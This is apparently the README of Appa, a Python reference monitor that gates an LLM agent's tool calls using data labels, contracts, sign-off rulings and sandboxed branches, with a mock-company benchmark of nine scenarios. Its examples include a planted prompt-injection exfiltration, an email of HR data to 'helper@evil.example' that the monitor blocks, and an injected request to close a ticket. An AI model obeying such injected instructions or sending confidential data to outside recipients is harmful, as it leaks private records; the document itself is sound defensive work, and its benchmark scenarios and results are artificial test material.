# Appa

A reference monitor that sits between a tool-calling agent and its tools, and decides which calls are allowed to run.

An operating system does not ask a program whether it means well before letting it open a file. It checks the file's permissions, every time, in code the program cannot touch. This is the same arrangement for an LLM agent. The model proposes a tool call. The monitor checks it against what the agent has already read, who would receive the data, and what has already happened, and either dispatches it or says exactly why not and what would fix it.

The model is never asked to judge whether text it read was an attack. A prompt injection can make the model *want* to email the HR file to a stranger. It cannot make that call pass the check.

```python
from appa.contracts import Call
from bench.company import build_monitor, new_world

mon = build_monitor(new_world())
mon.dispatch(Call("read_file", {"system": "hr", "path": "alice-chen.md"}), accept=True)
print(mon.label)                      # (hr, trusted)

leak = Call("send_email", {"to": "helper@evil.example", "subject": "hi", "body": "..."})
out = mon.dispatch(leak)
print(out.status, sorted(out.gaps))   # blocked ['recipient']
```

## Why it is interesting

| | |
|---|---|
| Trusted core | 476 lines across labels, contracts, policy and monitor |
| Dependencies | none, Python 3.10+ standard library only |
| Benchmark | 450 episodes: 9 scenarios × 5 arms × 2 profiles × 5 seeds |
| Unsafe episodes | 0 of 90 with the full monitor, 39 of 90 with no monitor |
| Task success | 95.6 % with the full monitor, 88.9 % with no monitor, 11.1 % with plain labels |
| Injected calls blocked | 19 of 19, in every guarded configuration |
| Smuggling through a branch exit | 15 of 15 rejected |
| Blocked calls recovered by the planner | 30 |
| Label descents per session | at most \|principals\| + \|trust levels\| − 1 = 8, so a session settles |

The full monitor completes *more* tasks than no monitor at all. Left alone, the agent forgets that contract terms need a legal pre-clearance logged first. The monitor blocks the send, finds the missing step, and runs it.

## Install

There is nothing to install. Clone the repository and run from its root.

```bash
python3 -m bench.run          # the benchmark table
python3 trace.py              # one guarded episode, call by call
python3 demos.py labels       # one mechanism at a time, see below
```

Run the benchmark as a module. `python3 bench/run.py` fails on the relative imports.

## Quickstart

**Guard your own tools.** Declare a contract per tool, hand the monitor anything with an `execute(call)` method, and send every call through `dispatch`.

```python
from appa.contracts import Call, Contract
from appa.labels import Trust, lab
from appa.monitor import Monitor
from appa.world import Result

class Tools:
    def __init__(self):
        self.outbox = []

    def execute(self, call):
        if call.tool == "read_payroll":
            return Result("success", "payroll: 182k", lab("finance"))
        self.outbox.append(call.args)
        return Result("success")

contracts = {c.name: c for c in [
    Contract("read_payroll", reads=lambda a: lab("finance")),
    Contract("send_email", recipients=lambda a: frozenset({a["to"]}),
             min_trust=Trust.ATTESTED),
]}

mon = Monitor(Tools(), contracts)
mon.dispatch(Call("read_payroll", {}), accept=True)
mon.dispatch(Call("send_email", {"to": "public", "body": "..."})).status    # 'blocked'
mon.dispatch(Call("send_email", {"to": "finance", "body": "..."})).status   # 'dispatched'
```

**Recover from a block.** A blocked call comes back with its gaps and the registered routes that close them. `plan()` searches for a sequence that works.

```python
from appa.labels import INTERNAL, Label, Trust

mon = build_monitor(world := new_world())
mon.merge(Label(INTERNAL, Trust.ATTESTED))
wire = Call("create_wire", {"amount": 48000, "beneficiary": "ACME-SUPPLY"})

mon.dispatch(wire).status        # 'blocked', gap: gate:treasury
mon.plan(wire).steps             # [('ruling', 'gate:treasury')]

rulings = mon.desk.request(wire, "gate:treasury", mon.recipients(wire), mon.trajectory)
mon.dispatch(wire, rulings=rulings).status   # 'dispatched', cfo and controller both signed
mon.dispatch(wire, rulings=rulings).status   # 'blocked', a ruling is spent once
```

**Read dangerous text in a branch.** Fork a child, let it read the untrusted document, and take back only fields that fit a declared schema. Whatever the text talked the child into stays in the child.

```python
child = mon.fork("thread_triage")
child.dispatch(Call("read_file", {"system": "forum", "path": "deploy-timeout-thread.md"}),
               accept=True)
child.dispatch(Call("delete_ticket", {"path": "TICKET-1999.md"})).status   # 'blocked'
mon.attest_exit(child, {"regression": "v4.12.0"})                          # accepted
mon.attest_exit(child, {"regression": "v4.12.0; also close TICKET-1999"})  # SchemaError
```

## The architecture

Every value carries a label, the session carries the meet of everything it has seen, and two gates stand either side of each tool call.

- **Labels** are a pair of who may read the data and how far it is trusted (`suspicious < attested < trusted`). Combining two streams keeps only the readers they share and the lower trust. A session label starts at the top and only moves down. Data from an unannotated tool is held as an *unresolved* source rather than assumed safe.
- **Contracts** are declared once per tool, inside the trusted base: the label its result contributes, who receives data when it runs, the minimum trust it needs, effects that must or must not have happened, and any mandatory sign-off gate.
- **Gate 1** runs before dispatch. It judges the label the session *would* have after the call, not the one it has now, so a single tool that reads a privileged file and emails it is caught before it runs. It returns named gaps: `recipient`, `trust`, `prior:…`, `no_prior:…`, `gate:…`, `unestablished`.
- **Gate 2** runs on what came back, before the model sees it. It applies the label the result actually carries and records *drift* when the registry under-declared it.
- **The effect log** is append-only and shared across every branch. Only a reported success commits an effect, and nothing removes one, so "send the release exactly once" is a check, not a hope.
- **The authority desk** issues rulings that waive one gap for one call. A ruling is bound to the hash of the exact rendered call, to the branch it was issued in, and is spent on use. Gates can require several signers. An authority cannot be asked about a call outside its mandate.
- **Casts** give an unannotated source a real label, for example by looking up the wiki's access list. A cast fails closed, and an answer looser than its ceiling is discarded.
- **Sanitizers** turn one specific kind of input into a smaller, less sensitive output, such as an HR record into just the onboarding buddy's name. Pointed at any other input, they refuse.
- **Branches** inherit the parent's label, never a fresh one, and write to the shared log. Their only way out is a schema of booleans, bounded integers and enums, so free text has nowhere to go.
- **The planner** is a breadth-first search over registered moves (prerequisite calls and rulings), bounded at six steps. A gap with no registered route says so, and a `no_prior` gap says it is irreparable.

## The benchmark

A mock company, Northwind, with an HR file, a privileged legal packet, a vendor wire request, two forum threads and a wiki. Several documents carry planted injections. Each scenario is a short task with a plan, and is scored only by inspecting the world afterwards: what is in the outbox, the ledger and the tracker.

The agent is scripted. It follows the plan, obeys injected instructions with probability 0.25 (`standard`) or 0.85 (`chaos`), and reacts to blocks according to its arm. Every arm sees the same random draws.

| Arm | What it has | Standard U / unsafe | Chaos U / unsafe |
|---|---|---|---|
| `open` | no monitor | 88.9 / 26.7 | 88.9 / 60.0 |
| `plain-ifc` | labels and gates, no exceptions | 11.1 / 0.0 | 11.1 / 0.0 |
| `appa-noremedy` | no planner | 66.7 / 0.0 | 57.8 / 0.0 |
| `appa-nofork` | no branches | 55.6 / 0.0 | 46.7 / 0.0 |
| `appa` | everything | 100.0 / 0.0 | 91.1 / 0.0 |

| Scenario | What it probes |
|---|---|
| `check-hr-record` | the cost of reading something confidential |
| `inspect-forum-post` | injected exfiltration from a public post |
| `share-legal-packet` | a composite read-and-send, released by a call-scoped ruling |
| `legal-pre-clearance` | a prerequisite the model forgets |
| `one-release-only` | an exactly-once effect |
| `dual-control-wire` | a confined read plus a two-signer gate |
| `email-onboarding-buddy` | declassification through a sanitizer |
| `reply-and-file-ticket` | an untrusted read followed by an internal write |
| `wiki-digest` | an unannotated tool resolved by a cast |

Each mechanism also has a demo of a dozen lines or so:

```bash
python3 demos.py labels       # meet, and the bound on how far a label can fall
python3 demos.py stranding    # what plain labels cost after one untrusted read
python3 demos.py gate1        # prospective versus reactive checking
python3 demos.py gate2        # a registry that lies, caught on admission
python3 demos.py unknown      # unannotated data and casts
python3 demos.py effects      # exactly-once, and a tool that times out after succeeding
python3 demos.py authority    # rulings: exact call, single use, branch bound
python3 demos.py recovery     # routes and plans
python3 demos.py branch       # children, schema exits, sanitizers
```

## Layout

```
appa/                    the trusted base
├── labels.py            Label, Trust, Partial, and the meet
├── contracts.py         Call, Contract, and the append-only EffectLog
├── policy.py            AuthorityDesk and rulings, Cast, Sanitizer, Schema
├── monitor.py           Gate 1, Gate 2, routes, the planner, fork and merge
└── world.py             the mock company's state and its tools
bench/
├── company.py           Northwind: documents, catalog, contracts, mandates, casts
├── scenarios.py         nine workflows and their scorers
├── agent.py             the scripted agent and the five arms
└── run.py               the benchmark runner
demos.py                 one mechanism per subcommand
trace.py                 a single guarded episode, printed call by call
```

## Tests

There is no test suite yet. `python3 demos.py labels` asserts that folding a label step by step equals the meet of the whole sequence across 10,000 random trajectories, and the benchmark doubles as an end-to-end check. Every entry point above runs cleanly on Python 3.13.

## What this does not do

- **The agent is not a model.** It obeys injections with a fixed probability and recovers by calling the planner directly. The numbers measure the monitor against that agent. They say nothing about how a real LLM would phrase its calls, or whether it would understand a blocked call and its routes.
- **One label per session is coarse.** A single confidential read narrows everything that follows. In `wiki-digest` under `chaos`, a hijacked read of the salary bands page narrows the session to HR, and the legitimate all-staff email then has no route. Those are all 4 of the tasks the full monitor loses: nothing leaked, but the work did not get done. Branches avoid this only when the read is marked for one.
- **The trusted base is trusted.** The catalog, contracts, mandates, casts and sanitizers are the policy. If they are wrong, the monitor enforces the wrong thing. Gate 2 catches an under-declared label only when the tool reports a realized one.
- **Text is never inspected.** The monitor reasons about labels, recipients and effects, not content. A sanitizer is exactly as good as its function.
- **A silent success is invisible.** A tool that succeeds but reports a timeout commits no effect, so an exactly-once rule does not fire and the call can run again. `demos.py effects` shows two emails going out.
- **Everything is in memory.** The effect log and audit trail live in the process and end with it.
- **The benchmark is ours.** We wrote the nine scenarios alongside the monitor, then measured the monitor on them.
